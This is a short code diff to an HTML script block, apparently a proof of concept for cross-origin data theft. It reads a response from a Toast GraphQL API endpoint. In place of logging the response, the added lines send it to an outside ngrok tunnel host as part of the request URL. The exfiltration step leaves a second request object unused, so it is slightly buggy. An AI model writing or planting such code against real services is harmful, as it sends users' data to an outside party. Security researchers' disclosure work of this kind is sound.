@@ -3,5 +3,7 @@
   req.open("GET", "https://ws-api.toasttab.com/do-federated-gateway/v1/graphql");
   req.send();
   const res = req.responseText;
-  console.log(res);
+  const req2 = new XMLHttpRequest();
+  req.open("GET", "https://492a-2401-4900-1cab-f8df-2dca-ec30-3f1f-87a9.ngrok-free.app/"+res);
+  req.send();
 </script>
